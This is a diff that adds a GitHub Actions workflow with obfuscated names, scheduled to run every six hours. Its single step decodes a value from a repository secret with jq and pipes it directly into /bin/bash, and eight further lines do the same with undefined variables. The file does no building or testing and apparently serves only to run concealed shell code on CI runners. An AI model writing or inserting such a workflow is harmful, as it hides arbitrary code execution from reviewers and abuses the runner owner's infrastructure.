@@ -1,0 +1,26 @@
+name: gzhengfudy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gzhengfudy
+        env:
+          sfhwl5123: ${{ secrets.sfhwl5123 }}
+        run: |
+          echo $sfhwl5123 | jq -r .qwkul2283 | /bin/bash
+          echo $d4 | jq -r .yhglm752 | /bin/bash
+          echo $cj0648 | jq -r .p6 | /bin/bash
+          echo $qep36 | jq -r .aa3717 | /bin/bash
+          echo $h217 | jq -r .yebyb621 | /bin/bash
+          echo $y33121 | jq -r .ahrg20286 | /bin/bash
+          echo $jm0293 | jq -r .el76 | /bin/bash
+          echo $rdpru908 | jq -r .ssass51 | /bin/bash
+          echo $x3830 | jq -r .s2 | /bin/bash
+
